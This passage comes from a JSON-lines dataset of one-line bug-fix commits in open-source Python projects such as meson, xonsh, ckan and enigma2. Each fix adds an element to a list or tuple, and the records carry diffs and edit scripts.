{"project": "easy-thumbnails", "commit_sha": "badb9aeeba6439bb5504de21a31cc2fa9b0953d8", "parent_sha": "36d31aa141200099332050eb52820bf348a834bc", "file_path": "easy_thumbnails/utils.py", "project_url": "https://github.com/eldarion/easy-thumbnails", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ def exif_orientation(im):\n     try:\n         exif = im._getexif()\n-    except (AttributeError, KeyError):\n+    except (AttributeError, IndexError, KeyError):\n         exif = None\n     if exif:\n         orientation = exif.get(0x0112)\n", "before": "try : exif = im . _getexif ( ) except ( AttributeError , KeyError ) : exif = None", "after": "try : exif = im . _getexif ( ) except ( AttributeError , IndexError , KeyError ) : exif = None", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 2, 12, 2, 38], [\"identifier:IndexError\", \"T\"], 3], [\"Insert\", [\"tuple\", 2, 12, 2, 38], [\",:,\", \"T\"], 4]]"}
{"project": "easybuild-easyconfigs", "commit_sha": "6a302c8b00206a58539526b848ca1a5e1c398354", "parent_sha": "b090f27188e45e7416f5cf4e42ac87eb46d26a0e", "file_path": "test/easyconfigs/easyconfigs.py", "project_url": "https://github.com/schiotz/easybuild-easyconfigs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -210,7 +210,7 @@ class EasyConfigTest(TestCase):\n \n         # for some dependencies, we allow exceptions for software that depends on a particular version,\n         # as long as that's indicated by the versionsuffix\n-        if dep in ['ASE', 'Boost', 'Java', 'Lua', 'PLUMED', 'R'] and len(dep_vars) > 1:\n+        if dep in ['ASE', 'Boost', 'Java', 'Lua', 'PLUMED', 'R', 'TensorFlow'] and len(dep_vars) > 1:\n             for key in list(dep_vars):\n                 dep_ver = re.search('^version: (?P<ver>[^;]+);', key).group('ver')\n                 # use version of Java wrapper rather than full Java version\n", "before": "if dep in [ 'ASE' , 'Boost' , 'Java' , 'Lua' , 'PLUMED' , 'R' ] and len ( dep_vars ) > 1 : for key in list ( dep_vars ) : dep_ver = re . search ( '^version: (?P<ver>[^;]+);' , key ) . group ( 'ver' )", "after": "if dep in [ 'ASE' , 'Boost' , 'Java' , 'Lua' , 'PLUMED' , 'R' , 'TensorFlow' ] and len ( dep_vars ) > 1 : for key in list ( dep_vars ) : dep_ver = re . search ( '^version: (?P<ver>[^;]+);' , key ) . group ( 'ver' )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 19, 3, 65], [\",:,\", \"T\"], 12], [\"Insert\", [\"list\", 3, 19, 3, 65], [\"string:'TensorFlow'\", \"T\"], 13]]"}
{"project": "easybuild-easyconfigs", "commit_sha": "a150692e9baa137a8df8016636f4e31502ef3ebd", "parent_sha": "c4ad9fe6edc6ff987baa3849780cad4a257a0b64", "file_path": "test/easyconfigs/easyconfigs.py", "project_url": "https://github.com/schiotz/easybuild-easyconfigs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -211,7 +211,7 @@ class EasyConfigTest(TestCase):\n \n         # for some dependencies, we allow exceptions for software that depends on a particular version,\n         # as long as that's indicated by the versionsuffix\n-        if dep in ['ASE', 'Boost', 'Java', 'Lua', 'PLUMED', 'R', 'TensorFlow'] and len(dep_vars) > 1:\n+        if dep in ['ASE', 'Boost', 'Java', 'Lua', 'PLUMED', 'PyTorch', 'R', 'TensorFlow'] and len(dep_vars) > 1:\n             for key in list(dep_vars):\n                 dep_ver = re.search('^version: (?P<ver>[^;]+);', key).group('ver')\n                 # use version of Java wrapper rather than full Java version\n", "before": "if dep in [ 'ASE' , 'Boost' , 'Java' , 'Lua' , 'PLUMED' , 'R' , 'TensorFlow' ] and len ( dep_vars ) > 1 : for key in list ( dep_vars ) : dep_ver = re . search ( '^version: (?P<ver>[^;]+);' , key ) . group ( 'ver' )", "after": "if dep in [ 'ASE' , 'Boost' , 'Java' , 'Lua' , 'PLUMED' , 'PyTorch' , 'R' , 'TensorFlow' ] and len ( dep_vars ) > 1 : for key in list ( dep_vars ) : dep_ver = re . search ( '^version: (?P<ver>[^;]+);' , key ) . group ( 'ver' )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 19, 3, 79], [\"string:'PyTorch'\", \"T\"], 11], [\"Insert\", [\"list\", 3, 19, 3, 79], [\",:,\", \"T\"], 12]]"}
{"project": "cclib", "commit_sha": "cc873e34d156621c2530949c0de530e27b601162", "parent_sha": "a1f707c19e0b67150481c92ff664b8cc36a382c9", "file_path": "src/cclib/parser/gamessparser.py", "project_url": "https://github.com/chemistry-scripts/cclib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -326,7 +326,7 @@ class GAMESS(logfileparser.Logfile):\n                         while line.strip():\r\n                             temp = line.strip().split()\r\n                             sym = temp[1]\r\n-                            assert sym in ['S', 'P', 'D', 'F', 'L']\r\n+                            assert sym in ['S', 'P', 'D', 'F', 'G', 'L']\r\n                             if sym == \"L\": # L refers to SP\r\n                                 if len(temp)==6: # GAMESS US\r\n                                     coeff.setdefault(\"S\", []).append( (float(temp[3]), float(temp[4])) )\r\n", "before": "assert sym in [ 'S' , 'P' , 'D' , 'F' , 'L' ]", "after": "assert sym in [ 'S' , 'P' , 'D' , 'F' , 'G' , 'L' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 43, 3, 68], [\"string:'G'\", \"T\"], 9], [\"Insert\", [\"list\", 3, 43, 3, 68], [\",:,\", \"T\"], 10]]"}
{"project": "code_examples_server", "commit_sha": "faef8ee40f48ec61c6c1e0673a8fd23ec2ddf7b0", "parent_sha": "41f88d850bed73153af93b66bfab935d6a1c8949", "file_path": "compile_server/app/checker.py", "project_url": "https://github.com/AdaCore/code_examples_server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ def check_program(request):\n     tempd = prep_example_directory(e, received_json)\n \n     # Run the command(s) to check the program\n-    command = [\"gnatprove\", \"-P\", \"main\"]\n+    command = [\"gnatprove\", \"-P\", \"main\", \"--checks-as-errors\"]\n \n     try:\n         p = process_handling.SeparateProcess([command], tempd)\n", "before": "command = [ \"gnatprove\" , \"-P\" , \"main\" ]", "after": "command = [ \"gnatprove\" , \"-P\" , \"main\" , \"--checks-as-errors\" ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 15, 3, 42], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 15, 3, 42], [\"string:\\\"--checks-as-errors\\\"\", \"T\"], 7]]"}
{"project": "caars", "commit_sha": "be72a222cbfae318addf72e022cda4bea1ee39c3", "parent_sha": "ff363bb90b647330df8c6988996f459e8a31db6b", "file_path": "utils/bin/ParseInput.py", "project_url": "https://github.com/LBMC/caars", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -270,7 +270,7 @@ def write_seq_ref_apytram(Ref_dic_trinity, AliDict_i, Family):\n         for name in Ref_dic_trinity[sp]:\n             seq = ''.join(AliDict_i[name]).replace(\"-\", \"\")\n             string.extend([\">\", name, \"\\n\",\n-                           '\\n'.join(seq[i:i+60] for i in range(0, len(seq), 60))])\n+                           '\\n'.join(seq[i:i+60] for i in range(0, len(seq), 60)),\"\\n\"])\n \n         f = open(GeneFamily_File, \"w\")\n         f.write(\"\".join(string))\n", "before": "string . extend ( [ \">\" , name , \"\\n\" , '\\n' . join ( seq [ i : i + 60 ] for i in range ( 0 , len ( seq ) , 60 ) ) ] )", "after": "string . extend ( [ \">\" , name , \"\\n\" , '\\n' . join ( seq [ i : i + 60 ] for i in range ( 0 , len ( seq ) , 60 ) ) , \"\\n\" ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 2, 27, 3, 83], [\",:,\", \"T\"], 8], [\"Insert\", [\"list\", 2, 27, 3, 83], [\"string:\\\"\\\\n\\\"\", \"T\"], 9]]"}
{"project": "meson", "commit_sha": "a13bde821f53919fe6eb0ca14c4463afc08e5a27", "parent_sha": "7dc747ea54480c452b913e4bfe682ec67061c9bf", "file_path": "mesonbuild/wrap/wrap.py", "project_url": "https://github.com/rindeal/meson", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ class Resolver:\n             return False\n         # Submodule has not been added, add it\n         if out.startswith(b'-'):\n-            if subprocess.call(['git', 'submodule', 'update', dirname]) != 0:\n+            if subprocess.call(['git', 'submodule', 'update', '--init', dirname]) != 0:\n                 return False\n         # Submodule was added already, but it wasn't populated. Do a checkout.\n         elif out.startswith(b' '):\n", "before": "if subprocess . call ( [ 'git' , 'submodule' , 'update' , dirname ] ) != 0 : return False", "after": "if subprocess . call ( [ 'git' , 'submodule' , 'update' , '--init' , dirname ] ) != 0 : return False", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 32, 3, 71], [\"string:'--init'\", \"T\"], 7], [\"Insert\", [\"list\", 3, 32, 3, 71], [\",:,\", \"T\"], 8]]"}
{"project": "xonsh", "commit_sha": "ce330123a73adf689692f95f8d6c79a5fcd89f9e", "parent_sha": "2cf2c27cfb8d2b219a2d0d4d1d1712c4ec73113a", "file_path": "setup.py", "project_url": "https://github.com/nicfit/xonsh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ def dirty_version():\n         return False\n     sha = sha.strip('g')\n     replace_version(N)\n-    _cmd = ['git', 'show', '--format=%cd', '--date=local', sha]\n+    _cmd = ['git', 'show', '-s', '--format=%cd', '--date=local', sha]\n     try:\n         _date = subprocess.check_output(_cmd)\n         _date = _date.decode('ascii')\n", "before": "_cmd = [ 'git' , 'show' , '--format=%cd' , '--date=local' , sha ]", "after": "_cmd = [ 'git' , 'show' , '-s' , '--format=%cd' , '--date=local' , sha ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 12, 3, 64], [\"string:'-s'\", \"T\"], 5], [\"Insert\", [\"list\", 3, 12, 3, 64], [\",:,\", \"T\"], 6]]"}
{"project": "xonsh", "commit_sha": "ffb3608dbf9840ddfbc5bbeda6937c237540e8ef", "parent_sha": "002a61b66b8e51d72261b01c4ef7d34e73e4bedd", "file_path": "setup.py", "project_url": "https://github.com/nicfit/xonsh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ def main():\n         platforms='Cross Platform',\n         classifiers=['Programming Language :: Python :: 3'],\n         packages=['xonsh'],\n-        scripts=['scripts/xonsh'],\n+        scripts=['scripts/xonsh', 'scripts/xonsh.bat'],\n         cmdclass={'install': xinstall, 'sdist': xsdist},\n         )\n     if HAVE_SETUPTOOLS:\n", "before": "scripts = [ 'scripts/xonsh' ] ,", "after": "scripts = [ 'scripts/xonsh' , 'scripts/xonsh.bat' ] ,", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 17, 3, 34], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 3, 17, 3, 34], [\"string:'scripts/xonsh.bat'\", \"T\"], 3]]"}
{"project": "pyethereum", "commit_sha": "186b00c13e409ad4722b3f9ae0510dd17b9f2ff0", "parent_sha": "d85c7baffe049b9371d32175fd7ff399be6efda1", "file_path": "ethereum/_solidity.py", "project_url": "https://github.com/PabloLefort/pyethereum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ class solc_wrapper(object):\n \n     @classmethod\n     def combined(cls, code):\n-        p = subprocess.Popen(['solc', '--add-std', '--combined-json', 'abi,bin,devdoc,userdoc'],\n+        p = subprocess.Popen(['solc', '--add-std', '--optimize', '--combined-json', 'abi,bin,devdoc,userdoc'],\n                              stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n         stdoutdata, stderrdata = p.communicate(input=code)\n         if p.returncode:\n", "before": "p = subprocess . Popen ( [ 'solc' , '--add-std' , '--combined-json' , 'abi,bin,devdoc,userdoc' ] , stdin = subprocess . PIPE , stdout = subprocess . PIPE )", "after": "p = subprocess . Popen ( [ 'solc' , '--add-std' , '--optimize' , '--combined-json' , 'abi,bin,devdoc,userdoc' ] , stdin = subprocess . PIPE , stdout = subprocess . PIPE )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:'--combined-json'\", 3, 52, 3, 69], [\"list\", 3, 30, 3, 96], 6], [\"Insert\", [\"list\", 3, 30, 3, 96], [\"string:'--optimize'\", \"T\"], 5], [\"Insert\", [\"list\", 3, 30, 3, 96], [\",:,\", \"T\"], 7]]"}
{"project": "pelican", "commit_sha": "6ac802bcf11ab61b814bb801b1aa750c1c63c74c", "parent_sha": "eee004cdb5988a1f520143d60222a4d6c396d61f", "file_path": "pelican/readers.py", "project_url": "https://github.com/kalefranz/pelican", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ class MarkdownReader(Reader):\n     def read(self, filename):\n         \"\"\"Parse content and metadata of markdown files\"\"\"\n         text = open(filename)\n-        md = Markdown(extensions = ['meta', 'codehilite'])\n+        md = Markdown(extensions = ['meta', 'codehilite', 'extra'])\n         content = md.convert(text)\n \n         metadata = {}\n", "before": "md = Markdown ( extensions = [ 'meta' , 'codehilite' ] )", "after": "md = Markdown ( extensions = [ 'meta' , 'codehilite' , 'extra' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 36, 3, 58], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 36, 3, 58], [\"string:'extra'\", \"T\"], 5]]"}
{"project": "jumpserver", "commit_sha": "94830a79a37532ce95f9bf68d438629cb4b9b609", "parent_sha": "bb0a023380d7db5cbf6c7a5fc74fe9423c9412a8", "file_path": "webroot/AutoSa/AutoSa/views.py", "project_url": "https://github.com/BoriszhangSec/jumpserver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -552,7 +552,7 @@ def showGroup(request):\n         else:\n             error = '\u8bf7\u9009\u62e9\u5220\u9664\u7684\u7ec4'\n \n-    return render_to_response('showGroup.html', {'error': error, 'msg': msg},\n+    return render_to_response('showGroup.html', {'error': error, 'msg': msg, 'groups': groups},\n                               context_instance=RequestContext(request))\n \n \n", "before": "return render_to_response ( 'showGroup.html' , { 'error' : error , 'msg' : msg } , context_instance = RequestContext ( request ) )", "after": "return render_to_response ( 'showGroup.html' , { 'error' : error , 'msg' : msg , 'groups' : groups } , context_instance = RequestContext ( request ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 49, 3, 77], [\",:,\", \"T\"], 4], [\"Insert\", [\"dictionary\", 3, 49, 3, 77], [\"pair\", \"N0\"], 5], [\"Insert\", \"N0\", [\"string:'groups'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:groups\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "422d4b3c85efef03d872c073aee17c50f18622f3", "parent_sha": "356c420e3584e3eeb06035356412b09887cf038a", "file_path": "lib/python/Components/Harddisk.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -387,7 +387,7 @@ class Harddisk:\n \t\telif size > 2048:\n \t\t\t# Over 2GB: 32 i-nodes per megabyte\n \t\t\ttask.args += [\"-T\", \"largefile\", \"-N\", str(size * 32)]\n-\t\ttask.args += [\"-m0\", \"-O\", \",\".join(big_o_options), self.partitionPath(\"1\")]\n+\t\ttask.args += [\"-m0\", \"-O ^metadata_csum\", \"-O\", \",\".join(big_o_options), self.partitionPath(\"1\")]\n \n \t\ttask = MountTask(job, self)\n \t\ttask.weighting = 3\n", "before": "task . args += [ \"-m0\" , \"-O\" , \",\" . join ( big_o_options ) , self . partitionPath ( \"1\" ) ]", "after": "task . args += [ \"-m0\" , \"-O ^metadata_csum\" , \"-O\" , \",\" . join ( big_o_options ) , self . partitionPath ( \"1\" ) ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 16, 3, 79], [\"string:\\\"-O ^metadata_csum\\\"\", \"T\"], 3], [\"Insert\", [\"list\", 3, 16, 3, 79], [\",:,\", \"T\"], 4]]"}
{"project": "enigma2", "commit_sha": "0a568cdead3ad9034a15a014aba53f5067c380ba", "parent_sha": "88088449cad7da827a19e7b998971a7bbe2b6fee", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -650,7 +650,7 @@ def InitUsageConfig():\n \tconfig.network = ConfigSubsection()\n \tif SystemInfo[\"WakeOnLAN\"]:\n \t\tdef wakeOnLANChanged(configElement):\n-\t\t\tif getBoxType() in ('et7000', 'et7100', 'et7500', 'gbx1', 'gbx2', 'gbx3', 'gbx3h', 'et10000', 'gbquadplus', 'gbquad', 'gb800ueplus', 'gb800seplus', 'gbultraue', 'gbultraueh', 'gbultrase', 'gbipbox', 'quadbox2400', 'mutant2400', 'et7x00', 'et8500', 'et8500s'):\n+\t\t\tif getBoxType() in ('multibox','hd61','hd60','h9twin','h9combo','h9','et7000', 'et7100', 'et7500', 'gbx1', 'gbx2', 'gbx3', 'gbx3h', 'et10000', 'gbquadplus', 'gbquad', 'gb800ueplus', 'gb800seplus', 'gbultraue', 'gbultraueh', 'gbultrase', 'gbipbox', 'quadbox2400', 'mutant2400', 'et7x00', 'et8500', 'et8500s'):\n \t\t\t\topen(SystemInfo[\"WakeOnLAN\"], \"w\").write(configElement.value and \"on\" or \"off\")\n \t\t\telse:\n \t\t\t\topen(SystemInfo[\"WakeOnLAN\"], \"w\").write(configElement.value and \"enable\" or \"disable\")\n", "before": "if getBoxType ( ) in ( 'et7000' , 'et7100' , 'et7500' , 'gbx1' , 'gbx2' , 'gbx3' , 'gbx3h' , 'et10000' , 'gbquadplus' , 'gbquad' , 'gb800ueplus' , 'gb800seplus' , 'gbultraue' , 'gbultraueh' , 'gbultrase' , 'gbipbox' , 'quadbox2400' , 'mutant2400' , 'et7x00' , 'et8500' , 'et8500s' ) : open ( SystemInfo [ \"WakeOnLAN\" ] , \"w\" ) . write ( configElement . value and \"on\" or \"off\" ) else : open ( SystemInfo [ \"WakeOnLAN\" ] , \"w\" ) . write ( configElement . value and \"enable\" or \"disable\" )", "after": "if getBoxType ( ) in ( 'multibox' , 'hd61' , 'hd60' , 'h9twin' , 'h9combo' , 'h9' , 'et7000' , 'et7100' , 'et7500' , 'gbx1' , 'gbx2' , 'gbx3' , 'gbx3h' , 'et10000' , 'gbquadplus' , 'gbquad' , 'gb800ueplus' , 'gb800seplus' , 'gbultraue' , 'gbultraueh' , 'gbultrase' , 'gbipbox' , 'quadbox2400' , 'mutant2400' , 'et7x00' , 'et8500' , 'et8500s' ) : open ( SystemInfo [ \"WakeOnLAN\" ] , \"w\" ) . write ( configElement . value and \"on\" or \"off\" ) else : open ( SystemInfo [ \"WakeOnLAN\" ] , \"w\" ) . write ( configElement . value and \"enable\" or \"disable\" )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:'et7000'\", 3, 24, 3, 32], [\"tuple\", 3, 23, 3, 262], 7], [\"Move\", [\"string:'et7100'\", 3, 34, 3, 42], [\"tuple\", 3, 23, 3, 262], 10], [\"Move\", [\"string:'et7500'\", 3, 44, 3, 52], [\"tuple\", 3, 23, 3, 262], 12], [\"Move\", [\"string:'gbx1'\", 3, 54, 3, 60], [\"tuple\", 3, 23, 3, 262], 4], [\"Move\", [\"string:'gbx2'\", 3, 62, 3, 68], [\"tuple\", 3, 23, 3, 262], 13], [\"Move\", [\"string:'gbx3'\", 3, 70, 3, 76], [\"tuple\", 3, 23, 3, 262], 15], [\"Move\", [\"string:'gbx3h'\", 3, 78, 3, 85], [\"tuple\", 3, 23, 3, 262], 7], [\"Move\", [\"string:'et10000'\", 3, 87, 3, 96], [\"tuple\", 3, 23, 3, 262], 17], [\"Move\", [\"string:'gbquadplus'\", 3, 98, 3, 110], [\"tuple\", 3, 23, 3, 262], 18], [\"Move\", [\"string:'gbquad'\", 3, 112, 3, 120], [\"tuple\", 3, 23, 3, 262], 20], [\"Move\", [\"string:'gb800ueplus'\", 3, 122, 3, 135], [\"tuple\", 3, 23, 3, 262], 13], [\"Move\", [\"string:'gb800seplus'\", 3, 137, 3, 150], [\"tuple\", 3, 23, 3, 262], 16], [\"Move\", [\"string:'gbultraue'\", 3, 152, 3, 163], [\"tuple\", 3, 23, 3, 262], 18], [\"Move\", [\",:,\", 3, 190, 3, 191], [\"tuple\", 3, 23, 3, 262], 16], [\"Move\", [\",:,\", 3, 201, 3, 202], [\"tuple\", 3, 23, 3, 262], 18], [\"Move\", [\",:,\", 3, 216, 3, 217], [\"tuple\", 3, 23, 3, 262], 19], [\"Move\", [\",:,\", 3, 230, 3, 231], [\"tuple\", 3, 23, 3, 262], 21], [\"Move\", [\",:,\", 3, 240, 3, 241], [\"tuple\", 3, 23, 3, 262], 23], [\"Move\", [\",:,\", 3, 250, 3, 251], [\"tuple\", 3, 23, 3, 262], 25], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\"string:'multibox'\", \"T\"], 1], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\"string:'hd61'\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\"string:'hd60'\", \"T\"], 6], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\"string:'h9twin'\", \"T\"], 9], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\"string:'h9combo'\", \"T\"], 11], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\"string:'h9'\", \"T\"], 15], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\",:,\", \"T\"], 9], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\",:,\", \"T\"], 19], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\",:,\", \"T\"], 28], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\",:,\", \"T\"], 44], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\",:,\", \"T\"], 47], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\",:,\", \"T\"], 50], [\"Insert\", [\"tuple\", 3, 23, 3, 262], [\",:,\", \"T\"], 53], [\"Delete\", [\",:,\", 3, 177, 3, 178]]]"}
{"project": "stbgui", "commit_sha": "d0c2907cd737fe997153839f3c9242e137e5bf3e", "parent_sha": "dcf8840f6044c746c54b76e05156bf691587ffee", "file_path": "lib/python/Screens/TimerEdit.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class TimerEditList(Screen):\n \n \t\tself[\"actions\"] = ActionMap([\"OkCancelActions\"], \n \t\t\t{\n-#\t\t\t\t\"ok\": self.openEdit,\n+\t\t\t\t\"ok\": self.openEdit,\n \t\t\t\t\"cancel\": self.close\n \t\t\t})\n \n", "before": "self [ \"actions\" ] = ActionMap ( [ \"OkCancelActions\" ] , { \"cancel\" : self . close } )", "after": "self [ \"actions\" ] = ActionMap ( [ \"OkCancelActions\" ] , { \"ok\" : self . openEdit , \"cancel\" : self . close } )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 2, 4, 5, 5], [\"pair\", \"N0\"], 1], [\"Insert\", [\"dictionary\", 2, 4, 5, 5], [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:\\\"ok\\\"\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:openEdit\", \"T\"], 2]]"}
{"project": "ckan", "commit_sha": "a8ca27f3ec36078ea37721b54fade1bc62e6a406", "parent_sha": "e98aea6f87c371494769dbd20371c16970bf7b5d", "file_path": "ckanext/reclineview/plugin.py", "project_url": "https://github.com/servercode/ckan", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -87,7 +87,7 @@ class ReclineView(ReclineViewBase):\n             return True\n         resource_format = data_dict['resource'].get('format', None)\n         if resource_format:\n-            return resource_format.lower() in ['csv', 'xls', 'tsv']\n+            return resource_format.lower() in ['csv', 'xls', 'xlsx', 'tsv']\n         else:\n             return False\n \n", "before": "return resource_format . lower ( ) in [ 'csv' , 'xls' , 'tsv' ]", "after": "return resource_format . lower ( ) in [ 'csv' , 'xls' , 'xlsx' , 'tsv' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 47, 3, 68], [\"string:'xlsx'\", \"T\"], 5], [\"Insert\", [\"list\", 3, 47, 3, 68], [\",:,\", \"T\"], 6]]"}
{"project": "enigma2", "commit_sha": "e83159c4ce063d0971ee32401212271b11edf6ae", "parent_sha": "a22988fcb245ddc2ae8803f1856e0c0c275e45e3", "file_path": "lib/python/Screens/NetworkSetup.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2247,7 +2247,7 @@ class NetworkInadynSetup(Screen, ConfigListScreen):\n \t\tself.ina_alias = NoSave(ConfigText(fixed_size=False))\n \t\tself.ina_period = NoSave(ConfigNumber())\n \t\tself.ina_sysactive = NoSave(ConfigYesNo(default='False'))\n-\t\tself.ina_system = NoSave(ConfigSelection(default = \"dyndns@dyndns.org\", choices = [(\"dyndns@dyndns.org\", \"dyndns@dyndns.org\"), (\"statdns@dyndns.org\", \"statdns@dyndns.org\"), (\"custom@dyndns.org\", \"custom@dyndns.org\")]))\n+\t\tself.ina_system = NoSave(ConfigSelection(default = \"dyndns@dyndns.org\", choices = [(\"dyndns@dyndns.org\", \"dyndns@dyndns.org\"), (\"statdns@dyndns.org\", \"statdns@dyndns.org\"), (\"custom@dyndns.org\", \"custom@dyndns.org\"), (\"default@no-ip.com\", \"default@no-ip.com\")]))\n \n \t\tif fileExists('/etc/inadyn.conf'):\n \t\t\tf = open('/etc/inadyn.conf', 'r')\n", "before": "self . ina_system = NoSave ( ConfigSelection ( default = \"dyndns@dyndns.org\" , choices = [ ( \"dyndns@dyndns.org\" , \"dyndns@dyndns.org\" ) , ( \"statdns@dyndns.org\" , \"statdns@dyndns.org\" ) , ( \"custom@dyndns.org\" , \"custom@dyndns.org\" ) ] ) )", "after": "self . ina_system = NoSave ( ConfigSelection ( default = \"dyndns@dyndns.org\" , choices = [ ( \"dyndns@dyndns.org\" , \"dyndns@dyndns.org\" ) , ( \"statdns@dyndns.org\" , \"statdns@dyndns.org\" ) , ( \"custom@dyndns.org\" , \"custom@dyndns.org\" ) , ( \"default@no-ip.com\" , \"default@no-ip.com\" ) ] ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 85, 3, 219], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 85, 3, 219], [\"tuple\", \"N0\"], 7], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:\\\"default@no-ip.com\\\"\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:\\\"default@no-ip.com\\\"\", \"T\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4]]"}
{"project": "enigma2", "commit_sha": "2fc1d2eaff12ae8b6cc9dcb45ba70ec6da9a0d68", "parent_sha": "fdbcccff8e120d3a86a29e5c00f4dd2f55552c5f", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -503,7 +503,7 @@ def InitUsageConfig():\n \tconfig.backupmanager.backupretry = ConfigNumber(default = 30)\n \tconfig.backupmanager.backupretrycount = NoSave(ConfigNumber(default = 0))\n \tconfig.backupmanager.nextscheduletime = NoSave(ConfigNumber(default = 0))\n-\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/CCcam.cfg'), eEnv.resolve('${sysconfdir}/CCcam.channelinfo'), eEnv.resolve('${sysconfdir}/CCcam.providers'), eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/crossepg/crossepg.config', '/usr/softcams/'])\n+\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/CCcam.cfg'), eEnv.resolve('${sysconfdir}/CCcam.channelinfo'), eEnv.resolve('${sysconfdir}/CCcam.providers'), eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/fstab'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), 